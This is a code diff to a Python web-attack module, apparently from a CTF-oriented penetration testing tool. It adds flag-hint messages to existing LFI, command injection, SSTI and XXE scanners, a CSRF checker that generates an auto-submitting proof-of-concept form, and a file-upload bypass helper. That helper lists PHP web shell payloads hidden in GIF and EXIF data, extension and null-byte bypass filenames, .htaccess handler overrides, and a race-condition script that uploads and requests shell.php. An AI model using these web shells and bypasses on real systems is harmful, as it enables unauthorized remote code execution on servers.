@@ -922,6 +922,10 @@ class WebModule:
                             results.append(f"      {t('web.resp_snippet')}: {resp_text[:500]}")
                 except Exception:
                     pass
+            # 如果尝试了所有路径都没找到 flag 内容，给出提示
+            if not any('possible_content' in r or 'flag{' in r.lower() for r in results[-len(flag_paths):] if isinstance(r, str)):
+                results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
+                results.append(f"      {t('web.try_custom_path')}")
 
         return f"{t('web.lfi_result')}:\n" + "\n".join(results)
 
@@ -1048,6 +1052,9 @@ class WebModule:
                             results.append(f"      {t('web.resp_snippet')}: {resp_text[:300]}")
                 except Exception:
                     pass
+            if not any('flag_found' in r or 'flag{' in r.lower() for r in results if isinstance(r, str)):
+                results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
+                results.append(f"      {t('web.try_custom_cmd')}")
 
         return f"{t('web.cmdi_result')}:\n" + "\n".join(results)
 
@@ -1209,6 +1216,9 @@ class WebModule:
 
         if not vuln_found and len(results) <= len(params) + (len(parse_qsl(data)) if data else 0):
             return f"[-] {t('web.no_ssti_found')}"
+        if vuln_found and not any('flag_found' in r or 'flag{' in r.lower() for r in results if isinstance(r, str)):
+            results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
+            results.append(f"      {t('web.try_custom_ssti')}")
         return f"{t('web.ssti_result')}:\n" + "\n".join(results)
 
     # ========== JWT 伪造/爆破 ==========
@@ -1427,6 +1437,9 @@ class WebModule:
                             results.append(f"      {t('web.resp_snippet')}: {resp_text[:300]}")
                 except Exception:
                     pass
+            if not any('flag_found' in r or 'flag{' in r.lower() for r in results if isinstance(r, str)):
+                results.append(f"\n  [*] {t('web.vuln_confirmed_no_flag')}")
+                results.append(f"      {t('web.try_custom_xxe')}")
 
         return '\n'.join(results)
 
@@ -3905,3 +3918,150 @@ class WebModule:
         results.append(f"  3. {t('web.sqli_auto.tip_sqlmap')}")
 
         return "\n".join(results)
+
+    # ==================== CSRF Detection ====================
+
+    def detect_csrf(self, url: str) -> str:
+        """CSRF 跨站请求伪造检测"""
+        self._check_requests()
+        results = [f"=== CSRF {t('web.detection')} ===", f"{t('web.target')}: {url}", ""]
+        found = False
+
+        try:
+            resp = self._get(url)
+        except Exception as e:
+            return f"[-] {t('web.connect_fail')}: {e}"
+
+        # 1. 检查 HTML 表单中是否缺少 CSRF Token
+        html = resp.text.lower()
+        forms = re.findall(r'<form[^>]*>.*?</form>', html, re.DOTALL)
+        csrf_keywords = ['csrf', '_token', 'authenticity_token', 'csrfmiddlewaretoken',
+                         '__requestverificationtoken', 'antiforgery', '_csrf_token']
+
+        if forms:
+            results.append(f"[*] {t('web.csrf.forms_found')}: {len(forms)}")
+            for i, form in enumerate(forms, 1):
+                has_token = any(kw in form for kw in csrf_keywords)
+                if not has_token and ('method' not in form or 'post' in form):
+                    results.append(f"  [!] Form #{i}: {t('web.csrf.no_token')}")
+                    found = True
+                else:
+                    results.append(f"  [+] Form #{i}: {t('web.csrf.has_token')}")
+        else:
+            results.append(f"[-] {t('web.csrf.no_forms')}")
+
+        # 2. 检查 Cookie SameSite 属性
+        results.append(f"\n=== Cookie SameSite {t('web.csrf.check')} ===")
+        cookies = resp.headers.get('Set-Cookie', '')
+        if cookies:
+            if 'samesite' not in cookies.lower():
+                results.append(f"  [!] {t('web.csrf.no_samesite')}")
+                found = True
+            else:
+                samesite = re.search(r'samesite=(\w+)', cookies, re.IGNORECASE)
+                if samesite:
+                    val = samesite.group(1).lower()
+                    if val == 'none':
+                        results.append(f"  [!] SameSite=None — {t('web.csrf.samesite_none')}")
+                        found = True
+                    else:
+                        results.append(f"  [+] SameSite={samesite.group(1)}")
+        else:
+            results.append(f"  [-] {t('web.csrf.no_cookies')}")
+
+        # 3. 检查安全头
+        results.append(f"\n=== {t('web.csrf.header_check')} ===")
+        headers = {k.lower(): v for k, v in resp.headers.items()}
+        if 'x-frame-options' not in headers:
+            results.append(f"  [!] {t('web.csrf.no_xfo')}")
+        else:
+            results.append(f"  [+] X-Frame-Options: {headers['x-frame-options']}")
+
+        # 4. 生成 CSRF PoC
+        if found:
+            results.append("\n=== CSRF PoC HTML ===")
+            poc = (
+                '<html>\n<body>\n'
+                f'  <h1>CSRF PoC</h1>\n'
+                f'  <form action="{url}" method="POST">\n'
+                '    <input type="hidden" name="param" value="evil" />\n'
+                '    <input type="submit" value="Submit" />\n'
+                '  </form>\n'
+                '  <script>document.forms[0].submit();</script>\n'
+                '</body>\n</html>'
+            )
+            results.append(poc)
+        else:
+            results.append(f"\n[+] {t('web.csrf.not_found')}")
+
+        return "\n".join(results)
+
+    # ==================== File Upload Helper ====================
+
+    def file_upload_helper(self, url: str = "") -> str:
+        """文件上传漏洞绕过辅助"""
+        lines = [f"=== {t('web.upload.title')} ===", ""]
+
+        # 1. Content-Type 绕过
+        lines.append(f"[1] Content-Type {t('web.upload.bypass')}:")
+        ct_payloads = [
+            ("image/jpeg", t("web.upload.ct_jpeg")),
+            ("image/png", t("web.upload.ct_png")),
+            ("image/gif", t("web.upload.ct_gif")),
+            ("application/octet-stream", t("web.upload.ct_octet")),
+        ]
+        for ct, desc in ct_payloads:
+            lines.append(f"  Content-Type: {ct}  — {desc}")
+
+        # 2. 扩展名绕过
+        lines.append(f"\n[2] {t('web.upload.ext_bypass')}:")
+        ext_payloads = [
+            "shell.php.jpg", "shell.php.png", "shell.php5", "shell.phtml",
+            "shell.pHp", "shell.PHP", "shell.php3", "shell.php7",
+            "shell.php%00.jpg", "shell.php\\x00.jpg",
+            "shell.jpg.php", "shell.php.",  "shell.php::$DATA",
+            "shell.php;.jpg", "shell.php%0a.jpg",
+        ]
+        for p in ext_payloads:
+            lines.append(f"  {p}")
+
+        # 3. .htaccess 利用
+        lines.append(f"\n[3] .htaccess {t('web.upload.htaccess')}:")
+        lines.append('  AddType application/x-httpd-php .jpg')
+        lines.append('  AddType application/x-httpd-php .png')
+        lines.append('  SetHandler application/x-httpd-php')
+
+        # 4. 图片马
+        lines.append(f"\n[4] {t('web.upload.image_shell')}:")
+        lines.append("  # GIF + PHP:")
+        lines.append("  GIF89a<?php @eval($_POST['cmd']);?>")
+        lines.append("")
+        lines.append("  # PNG + PHP (exiftool):")
+        lines.append("  exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png")
+        lines.append("")
+        lines.append("  # JPEG + PHP:")
+        lines.append("  exiftool -Comment='<?php eval($_POST[\"a\"]); ?>' image.jpg")
+
+        # 5. 二次渲染绕过
+        lines.append(f"\n[5] {t('web.upload.re_render')}:")
+        lines.append(f"  - {t('web.upload.re_render_tip1')}")
+        lines.append(f"  - {t('web.upload.re_render_tip2')}")
+        lines.append(f"  - {t('web.upload.re_render_tip3')}")
+
+        # 6. 分块上传 / 竞争条件
+        lines.append(f"\n[6] {t('web.upload.race')}:")
+        lines.append("  import threading, requests")
+        lines.append("  def upload(): requests.post(url, files={'file': open('shell.php','rb')})")
+        lines.append("  def access(): requests.get(url + '/uploads/shell.php')")
+        lines.append("  for _ in range(100):")
+        lines.append("      threading.Thread(target=upload).start()")
+        lines.append("      threading.Thread(target=access).start()")
+
+        # 7. 常见上传路径
+        lines.append(f"\n[7] {t('web.upload.common_paths')}:")
+        paths = ['/upload/', '/uploads/', '/files/', '/images/', '/media/',
+                 '/static/uploads/', '/wp-content/uploads/', '/tmp/', '/var/tmp/']
+        for p in paths:
+            lines.append(f"  {p}")
+
+        return "\n".join(lines)
